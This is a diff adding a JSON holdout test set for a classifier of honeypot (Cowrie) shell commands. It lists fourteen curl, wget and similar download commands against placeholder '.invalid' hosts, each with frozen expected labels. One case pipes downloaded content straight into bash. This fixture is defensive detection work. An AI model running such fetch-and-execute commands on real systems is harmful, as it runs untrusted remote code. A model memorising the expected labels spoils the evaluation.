@@ -1,0 +1,23 @@
+{
+  "schema_version": "typed_command_transfer_attempt_holdout.v1",
+  "evaluation_id": "cowrie-command-transfer-attempt-holdout-20260730",
+  "implementation_revision": "7e66689",
+  "expected_labels_frozen_before_execution": true,
+  "authorship_method": "Authored after implementation tests and before first holdout execution; literal URL retention is expected even when operations abstain.",
+  "cases": [
+    {"case_id": "CTH-001", "command": "wget https://packages.invalid/bootstrap.sh", "outcome": "success", "expected_operations": ["remote_content_access", "transfer_attempt"], "expected_urls": ["https://packages.invalid/bootstrap.sh"], "eligible_matches": 1},
+    {"case_id": "CTH-002", "command": "curl --connect-timeout 2 -o /run/cowrie/chunk https://objects.invalid/chunk", "outcome": "success", "expected_operations": ["remote_content_access", "transfer_attempt"], "expected_urls": ["https://objects.invalid/chunk"], "eligible_matches": 1},
+    {"case_id": "CTH-003", "command": "curl -f -s -S https://api.invalid/body", "outcome": "success", "expected_operations": ["remote_content_access", "transfer_attempt"], "expected_urls": ["https://api.invalid/body"], "eligible_matches": 1},
+    {"case_id": "CTH-004", "command": "wget --timeout 5 https://slow.invalid/item", "outcome": "success", "expected_operations": ["remote_content_access", "transfer_attempt"], "expected_urls": ["https://slow.invalid/item"], "eligible_matches": 1},
+    {"case_id": "CTH-005", "command": "sudo curl https://wrapped.invalid/item", "outcome": "success", "expected_operations": ["remote_content_access", "transfer_attempt"], "expected_urls": ["https://wrapped.invalid/item"], "eligible_matches": 1},
+    {"case_id": "CTH-006", "command": "wget -O /run/cowrie/item https://ordered.invalid/item", "outcome": "success", "expected_operations": ["remote_content_access", "transfer_attempt"], "expected_urls": ["https://ordered.invalid/item"], "eligible_matches": 1},
+    {"case_id": "CTH-007", "command": "curl https://failed-holdout.invalid/a", "outcome": "failure", "expected_operations": ["remote_content_access", "transfer_attempt"], "expected_urls": ["https://failed-holdout.invalid/a"], "eligible_matches": 0},
+    {"case_id": "CTH-008", "command": "wget https://unknown-holdout.invalid/a", "outcome": "unknown", "expected_operations": ["remote_content_access", "transfer_attempt"], "expected_urls": ["https://unknown-holdout.invalid/a"], "eligible_matches": 0},
+    {"case_id": "CTH-009", "command": "curl https://piped-holdout.invalid/a | bash", "outcome": "success", "expected_operations": ["remote_content_access", "remote_content_pipe_source", "transfer_attempt", "shell_pipe_execution_attempt"], "expected_urls": ["https://piped-holdout.invalid/a"], "eligible_matches": 0},
+    {"case_id": "CTH-010", "command": "curl --retry 2 https://unsupported-holdout.invalid/a", "outcome": "success", "expected_operations": ["unknown"], "expected_urls": ["https://unsupported-holdout.invalid/a"], "eligible_matches": 0},
+    {"case_id": "CTH-011", "command": "wget https://literal-holdout.invalid/a -O \"$TARGET_PATH\"", "outcome": "success", "expected_operations": ["unknown"], "expected_urls": ["https://literal-holdout.invalid/a"], "eligible_matches": 0},
+    {"case_id": "CTH-012", "command": "printf https://display-only.invalid/a", "outcome": "success", "attck": "T1105", "inject_non_authoritative_context": true, "expected_operations": ["literal_data_emission"], "expected_urls": ["https://display-only.invalid/a"], "eligible_matches": 0},
+    {"case_id": "CTH-013", "command": "curl ftp://legacy.invalid/a", "outcome": "success", "expected_operations": ["unknown"], "expected_urls": [], "eligible_matches": 0},
+    {"case_id": "CTH-014", "command": "aria2c https://unsupported-tool.invalid/a", "outcome": "success", "expected_operations": ["unknown"], "expected_urls": ["https://unsupported-tool.invalid/a"], "eligible_matches": 0}
+  ]
+}
